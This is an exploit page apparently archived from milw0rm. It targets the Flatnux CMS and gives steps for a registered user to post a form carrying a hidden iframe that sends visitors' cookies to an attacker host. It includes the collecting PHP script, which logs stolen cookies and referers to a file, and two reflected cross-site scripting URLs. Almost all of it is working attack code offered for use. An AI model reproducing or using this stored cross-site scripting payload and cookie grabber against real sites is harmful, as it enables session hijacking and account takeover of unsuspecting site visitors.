<html><head><title>Flatnux html/javascript Injection Cookie Grabber Exploit</title></head><pre>&lt;!--
exploit flatnux grabber cookies visitor
site :http://www.speleoalex.altervista.org/flatnuke3/index.php
download:http://www.speleoalex.altervista.org/flatnuke3/index.php?mod=06_Download
author:gmda

Flatnux does not filter code html/javascript then you can injector in this way:

operation
1] register
2] make longin
3] use the HTML code below
--&gt;
&lt;html&gt;&lt;head&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;http://victim.org/flatnux/index.php?mod=08_Files&amp;amp;opmod=insertrecord&quot; method=&quot;POST&quot;&gt;
titolo*&lt;input  size =&quot;20&quot;  style=&quot;visibility:hidden;&quot; value=&quot;filex &amp;lt;iframe  width=&amp;quot;0&amp;quot; height=&amp;quot;0&amp;quot; style=&amp;quot;visibility:hidden;&amp;quot; src=&amp;quot;javascript:window.location=&amp;apos;http://attacker.org/grab.php?cmd=&amp;apos;+document.cookie;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&quot; name=&quot;name&quot; type=&quot;text&quot; /&gt;&lt;br /&gt;
&lt;textarea title=&quot;Inserisci qui la descrizione&quot; cols=&quot;80&quot;  rows=&quot;10&quot;  name=&quot;description&quot; style=&quot;visibility:hidden;&quot; &gt;&lt;/textarea&gt;&lt;br /&gt;
Immagine&lt;input  size=&quot;20&quot; name=&quot;foto1&quot; type=&quot;file&quot; style=&quot;visibility:hidden;&quot; /&gt;&lt;br /&gt;
File&lt;input  size=&quot;20&quot; name=&quot;file&quot; type=&quot;file&quot; style=&quot;visibility:hidden;&quot; /&gt;&lt;br /&gt;
&lt;input type=&quot;submit&quot; value=&quot;Zic&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;!-- grab.php
&lt;?php $data = $_GET['cmd'];
$date=date(&quot;j F, Y, g:i a&quot;);
$referer=$_SERVER['HTTP_REFERER'];
$fh = fopen(&quot;cookie.txt&quot;,'a+');
fwrite($fh, $referer . &quot; / &quot; . $data.&quot;\n&quot;.$date.&quot;\n&quot;);
fclose($fh);
?&gt;
--&gt;

&lt;!-- xss variables mod foto

/sections/05_Foto/photo.php?mod=05_Foto&amp;foto=&gt;&quot;&gt;&lt;script&gt;alert(69)%3B&lt;/script&gt;&amp;lang=it
/?mod=%3E%22%3E%3Cscript%3Ealert(69)%3B%3C/script%3E

--&gt;

# milw0rm.com [2008-12-14]</pre></html>